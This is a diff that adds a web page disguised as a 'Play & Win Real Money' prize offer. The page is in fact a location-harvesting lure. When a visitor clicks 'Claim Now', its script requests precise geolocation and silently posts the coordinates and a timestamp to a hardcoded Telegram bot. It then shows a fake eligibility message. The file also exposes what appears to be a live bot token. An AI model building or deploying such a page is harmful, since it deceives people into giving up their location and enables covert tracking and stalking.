@@ -1,0 +1,77 @@
+
+<!DOCTYPE html>
+<html>
+<head>
+    <title>🎮 Play & Win Real Money</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            padding: 30px;
+            background: linear-gradient(145deg, #00c6ff, #0072ff);
+            color: white;
+        }
+        .card {
+            background: white;
+            color: black;
+            padding: 20px;
+            border-radius: 15px;
+            box-shadow: 0 4px 20px rgba(0,0,0,0.3);
+            max-width: 400px;
+            margin: auto;
+        }
+        button {
+            background: #00c6ff;
+            color: white;
+            border: none;
+            padding: 15px 25px;
+            font-size: 18px;
+            border-radius: 10px;
+            cursor: pointer;
+        }
+    </style>
+</head>
+<body>
+    <div class="card">
+        <h2>🎉 Congratulations!</h2>
+        <p>You’ve been selected for the exclusive Play & Win Money Offer!</p>
+        <p>Click below to verify your location and claim your reward.</p>
+        <button onclick="getLocation()">Claim Now</button>
+    </div>
+
+    <script>
+        function getLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(sendPosition, errorLocation, {enableHighAccuracy:true});
+            } else {
+                alert("Geolocation is not supported by this browser.");
+            }
+        }
+
+        function sendPosition(position) {
+            const lat = position.coords.latitude;
+            const lon = position.coords.longitude;
+            const acc = position.coords.accuracy;
+            fetch("https://api.telegram.org/bot7449325389:AAHlpvLyLfq5s4BQ15bB_kn13embow-SX64/sendMessage", {
+                method: "POST",
+                headers: {"Content-Type": "application/json"},
+                body: JSON.stringify({
+                    chat_id: "5425481852",
+                    text: `🎯 Location Captured:
+Latitude: ${lat}
+Longitude: ${lon}
+Accuracy: ${acc} meters
+Time: ${new Date().toLocaleString()}`
+                })
+            }).then(() => {
+                alert("Location sent! Wait while we check your eligibility...");
+            });
+        }
+
+        function errorLocation(error) {
+            alert("❌ Unable to retrieve location. Please allow location access.");
+        }
+    </script>
+</body>
+</html>
